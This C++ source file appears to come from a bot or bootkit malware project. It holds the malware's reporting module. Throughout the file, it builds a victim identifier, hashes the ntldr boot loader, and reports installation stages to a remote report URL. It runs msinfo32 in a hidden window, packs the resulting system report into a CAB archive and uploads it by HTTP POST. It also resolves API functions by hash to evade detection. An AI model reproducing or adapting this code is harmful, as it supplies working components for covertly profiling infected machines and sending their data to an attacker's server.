#include <shlobj.h>

#include "BotCore.h"
#include "DbgRpt.h"
#include "CabPacker.h" 

//----------------------------------------------------------------------------
#include "BotDebug.h"

namespace DBGRPTDEBGTEMPLATES
{
	#include "DbgTemplates.h"
}

#define DBGRPTDBG DBGRPTDEBGTEMPLATES::DBGOutMessage<>

#ifdef DBGRPT_ENABLED
	PP_COMPILER_MESSAGE("Statistic debug reporting enabled.('DBGRPT_ENABLED' defined)");
#else
	PP_COMPILER_MESSAGE("Statistic debug reporting disabled.('DBGRPT_ENABLED' NOT defined.)");
#endif

void DebugReportStepByName(const char* StepName)
{
	CHAR BotUid[200];
	
	m_memset(BotUid, 0, sizeof(BotUid));

	GenerateUid(BotUid);

	PStrings Fields = Strings::Create();
	AddURLParam(Fields, "cmd", "step");
	AddURLParam(Fields, "uid", BotUid);
	AddURLParam(Fields, "step", (PCHAR)StepName);

	PCHAR Params = Strings::GetText(Fields, "&");
	PCHAR URL = STR::New(2, PP_REPORT_URL, Params);

	DBGRPTDBG("DebugReportStepByName", "go to url='%s'", URL);

	PCHAR Buffer = NULL;
	HTTP::Get(URL, &Buffer, NULL);

	STR::Free(Buffer);
	STR::Free(URL);
	STR::Free(Params);
	Strings::Free(Fields);
}

void DbgRptSprintfA(char* buffer, const char* format, ...)
{
  va_list ptr;
  va_start(ptr, format);
  pwvsprintfA(buffer, format, ptr);
  va_end(ptr);
}

char* CalcNtldrMd5(char* Buffer, DWORD BufferSize)
{
	CHAR path[MAX_PATH];

	pGetWindowsDirectoryA(path, MAX_PATH);
	path[3] = '\0';

	m_lstrcat(path, "ntldr");

	m_memset(Buffer, 0, BufferSize);
	char* md5 = CalcFileMD5Hash(path);

	if (md5 == NULL) return NULL;
	if (BufferSize < 33) return NULL;

	for (size_t i = 0; i < 16; i++)
	{
		char ByteBuffer[10];
		DbgRptSprintfA(ByteBuffer, "%02X", (BYTE)md5[i]);
		m_lstrcat(Buffer, ByteBuffer);
	}

	return Buffer;
}

void DebugReportStep1()
{
	CHAR BotUid[200];
	CHAR NtldrMd5Buffer[100];
	PCHAR OsInfo = NULL;
	PCHAR NtldrMd5 = NULL;

	m_memset(BotUid, 0, sizeof(BotUid));

	GenerateUid(BotUid);
	OsInfo = GetOSInfo();
	NtldrMd5 = CalcNtldrMd5(NtldrMd5Buffer, sizeof(NtldrMd5Buffer));

	PStrings Fields = Strings::Create();
	AddURLParam(Fields, "cmd", "beforerbt");
	AddURLParam(Fields, "uid", BotUid);
	AddURLParam(Fields, "os", OsInfo);

	if (NtldrMd5 != NULL)
	{
		AddURLParam(Fields, "cs01", NtldrMd5);
	}

	PCHAR Params = Strings::GetText(Fields, "&");
	PCHAR URL = STR::New(2, PP_REPORT_URL, Params);

	DBGRPTDBG("DebugReportStep1", "sending url='%s'", URL);

	PCHAR Buffer = NULL;
	HTTP::Get(URL, &Buffer, NULL);

	STR::Free(Buffer);
	STR::Free(URL);
	STR::Free(Params);
	Strings::Free(Fields);
	MemFree(OsInfo);
}

void DebugReportStep2(DWORD BkInstallResult)
{
	CHAR BotUid[200];
	CHAR value[50];

	typedef int ( WINAPI *fwsprintfA)( PCHAR lpOut, PCHAR lpFmt, ... );
	fwsprintfA _pwsprintfA = (fwsprintfA)GetProcAddressEx( NULL, 3, 0xEA3AF0D7 );

	m_memset(BotUid, 0, sizeof(BotUid));
	m_memset(value, 0, sizeof(value));

	GenerateUid(BotUid);
	_pwsprintfA(value, "%u", BkInstallResult);

	PStrings Fields = Strings::Create();
	AddURLParam(Fields, "cmd", "bkinstall");
	AddURLParam(Fields, "uid", BotUid);
	AddURLParam(Fields, "val", value);

	PCHAR Params = Strings::GetText(Fields, "&");
	PCHAR URL = STR::New(2, PP_REPORT_URL, Params);
	
	DBGRPTDBG("DebugReportStep2", "sending url='%s'", URL);

	PCHAR Buffer = NULL;
	HTTP::Get(URL, &Buffer, NULL);

	STR::Free(Buffer);
	STR::Free(URL);
	STR::Free(Params);
	Strings::Free(Fields);
}

void DebugReportUpdateNtldrCheckSum()
{
	CHAR BotUid[200];
	CHAR NtldrMd5Buffer[100];
	PCHAR NtldrMd5 = NULL;

	m_memset(BotUid, 0, sizeof(BotUid));

	GenerateUid(BotUid);
	NtldrMd5 = CalcNtldrMd5(NtldrMd5Buffer, sizeof(NtldrMd5Buffer));

	PStrings Fields = Strings::Create();
	AddURLParam(Fields, "cmd", "csup");
	AddURLParam(Fields, "uid", BotUid);

	if (NtldrMd5 != NULL)
	{
		AddURLParam(Fields, "cs01", NtldrMd5);
	}

	PCHAR Params = Strings::GetText(Fields, "&");
	PCHAR URL = STR::New(2, PP_REPORT_URL, Params);

	DBGRPTDBG("DebugReportUpdateNtldrCheckSumm", "go to url='%s'", URL);
	PCHAR Buffer = NULL;
	HTTP::Get(URL, &Buffer, NULL);

	STR::Free(Buffer);
	STR::Free(URL);
	STR::Free(Params);
	Strings::Free(Fields);
}

PCHAR GetPathToMsInfo32()
{
	int FolderId = CSIDL_SYSTEM;
	const char* PathSuffix = "\\";

	OSVERSIONINFOEXA ver;

	m_memset(&ver, 0, sizeof(ver));
	ver.dwOSVersionInfoSize = sizeof(ver);

	if (!(BOOL)pGetVersionExA(&ver)) return NULL;

	if (ver.dwMajorVersion == 5)
	{
		FolderId = CSIDL_PROGRAM_FILES;
		PathSuffix = "\\Common Files\\Microsoft Shared\\MSInfo\\";
	}

	PCHAR Path = STR::Alloc(2 * MAX_PATH);
	m_memset(Path, 0, STR::Length(Path));

	pSHGetSpecialFolderPathA(NULL, Path, FolderId, false);
	m_lstrcat(Path, PathSuffix);
	m_lstrcat(Path, "msinfo32.exe");

	return Path;
}

void DebugReportSendSysInfo(PCHAR uid, PCHAR path)
{
	PStrings Fields = Strings::Create();
	AddURLParam(Fields, "cmd", "storefile");
	AddURLParam(Fields, "uid", (PCHAR)uid);

	PCHAR Params = Strings::GetText(Fields, "&");
	PCHAR URL = STR::New(2, PP_REPORT_URL, Params);

	DBGRPTDBG("DebugReportSendSysInfo", "sending url='%s'", URL);

	PMultiPartData Data = MultiPartData::Create();

	MultiPartData::AddFileField(Data, "rep", path, NULL);
	PCHAR Buffer = NULL;
	bool Result = HTTP::Post(URL, Data, &Buffer, NULL);

	DBGRPTDBG("DebugReportSendSysInfo", "HTTP::Post() result %d", Result);

	STR::Free(Buffer);
	MultiPartData::Free(Data);
	STR::Free(URL);
	STR::Free(Params);
	Strings::Free(Fields);
}

void DebugReportCreateConfigReportAndSend()
{
	PCHAR MsInfoPath = NULL;
	PCHAR MsInfoParam = NULL;
	PCHAR ReportPath = NULL;
	PCHAR CabPath = NULL;

	do
	{
		// Получаем путь к msinfo32.exe
		MsInfoPath = GetPathToMsInfo32();
		DBGRPTDBG("DebugReportCreateConfigReportAndSend", "GetPathToMsInfo32() return '%s;", MsInfoPath);
		if (MsInfoPath == NULL) break;

		// Временный файл для отчета
		ReportPath = File::GetTempNameA();
		DBGRPTDBG("DebugReportCreateConfigReportAndSend", "GetTempNameA() for report file return '%s;", ReportPath);
		if (ReportPath == NULL) break;

		MsInfoParam = STR::Alloc(2 * MAX_PATH);
		if (MsInfoParam == NULL) break;

		PROCESS_INFORMATION pi;
		STARTUPINFOA si;

		m_memset(&si, 0, sizeof(si));
		m_memset(&pi, 0, sizeof(pi));
		m_memset(MsInfoParam, 0, STR::Length(MsInfoParam));

		// Запускаем скрытно
		si.cb = sizeof(si);
		si.wShowWindow = SW_HIDE;
		
		m_lstrcat(MsInfoParam, " /report \"");
		m_lstrcat(MsInfoParam, ReportPath);
		m_lstrcat(MsInfoParam, "\"");
		
		DBGRPTDBG("DebugReportCreateConfigReportAndSend", "CreateProcess('%s', '%s')",
			MsInfoPath, MsInfoParam);

		BOOL process_result = (BOOL)pCreateProcessA(MsInfoPath, MsInfoParam, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);

		DBGRPTDBG("DebugReportCreateConfigReportAndSend", "CreateProcess return %d.(ph=0x%X pid=%d)",
			process_result, pi.hProcess, pi.dwProcessId);

		if (process_result == FALSE) break;
		if (pi.hProcess == NULL) break;

		if (pi.hProcess != NULL)
		{
			DBGRPTDBG("DebugReportCreateConfigReportAndSend", "Waiting for msinfo32.");
			pWaitForSingleObject(pi.hProcess, INFINITE);
			pCloseHandle(pi.hProcess);
		}

		if (pi.hThread != NULL) pCloseHandle(pi.hThread);

		DWORD attributes = (DWORD)pGetFileAttributesA(ReportPath);
		DBGRPTDBG("DebugReportCreateConfigReportAndSend", "'%s' attibutes 0x%X.",
			ReportPath, attributes);
		if (attributes == INVALID_FILE_ATTRIBUTES) break;

		CabPath = File::GetTempNameA();
		HCAB CabHandle = CreateCab(CabPath);

		DBGRPTDBG("DebugReportCreateConfigReportAndSend", "CreateCab() return 0x%X.",
			CabHandle);

		if (CabHandle == NULL) break;

		AddFileToCab(CabHandle, ReportPath, "sysinfo.txt");
		CloseCab(CabHandle);

		char uid[200];

		DBGRPTDBG("DebugReportCreateConfigReportAndSend", "sending sysinfo report.");

		GenerateUid(uid);
		DebugReportSendSysInfo(uid, CabPath);

		DBGRPTDBG("DebugReportCreateConfigReportAndSend", "sysinfo report sent.");
	}
	while (false);

	if (ReportPath != NULL) pDeleteFileA(ReportPath);
	if (CabPath != NULL)    pDeleteFileA(CabPath);

	if (ReportPath != NULL) STR::Free(ReportPath);
	if (CabPath != NULL)    STR::Free(CabPath);
	if (MsInfoPath != NULL) STR::Free(MsInfoPath);

	DBGRPTDBG("DebugReportCreateConfigReportAndSend", "finished.");
}

